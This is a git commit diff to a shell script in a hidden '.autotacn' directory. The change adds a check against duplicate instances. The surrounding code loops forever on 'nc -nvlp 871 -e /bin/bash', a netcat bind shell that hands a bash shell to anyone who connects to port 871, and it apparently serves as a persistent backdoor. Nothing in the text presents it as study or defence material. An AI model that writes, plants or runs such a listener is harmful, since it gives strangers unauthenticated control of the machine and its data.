82ea165e76bf6d8d3cbf62578eac2505f4015d49
wize <51327451+77697a65@users.noreply.github.com>
2020-01-08 22:52:53 +0000

    Update tacnwd.sh

--- .autotacn/tacnwd.sh
+++ .autotacn/tacnwd.sh
@@ -1,6 +1,10 @@
 #!/bin/bash
 
-killall tacnwd.sh
+dupe_script=$(ps -ef | grep "tacnwd.sh" | grep -v grep | wc -l)
+
+if [ ${dupe_script} -gt 3 ]; then
+    exit 0
+fi
 
 while true; do
   until nc -nvlp 871 -e /bin/bash; do
